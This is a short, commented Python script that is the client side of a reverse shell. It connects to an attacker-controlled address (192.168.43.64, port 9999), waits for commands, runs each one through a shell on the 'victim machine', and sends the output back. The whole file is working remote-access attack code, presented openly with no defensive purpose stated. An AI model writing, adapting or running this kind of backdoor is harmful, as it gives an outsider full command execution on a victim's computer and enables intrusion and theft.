#importing important libraries.
import socket
import os
import subprocess

#creating the variables and assigning the values.
s = socket.socket()
host = '192.168.43.64' #here host ip should equal to attacker ip.
port = 9999 #port no. for both server and client file should be same.

s.connect((host,port)) #s.connect is used to bind host ip and port in client machine whereas in server we use s.bind method.

while True:  #creating the infinite loop for recving the commands from the attacker. 
    data = s.recv(1024)  #create a variable to hold a data enter from the attacker.
    if data[:2].decode("utf-8") == "cd":  #checking if the command enter by attacker is equal to cd or not.
       os.chdir(data[3:].decode("utf-8"))  #if above condition is true this will execute.

    if len(data) > 0: #condition to check is the data enter by the attacker in not null.
       #executing the commands on victim machine by decoding into string format.
       cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
       output_byte =  cmd.stdout.read() + cmd.stderr.read()
       output_str = str(output_byte,"utf-8")
       currentWD =  os.getcwd() + "> "   #helps to find the currend wordking dir in victim machine.
       s.send(str.encode(output_str + currentWD)) #sending the command to server/attacker machine.
    

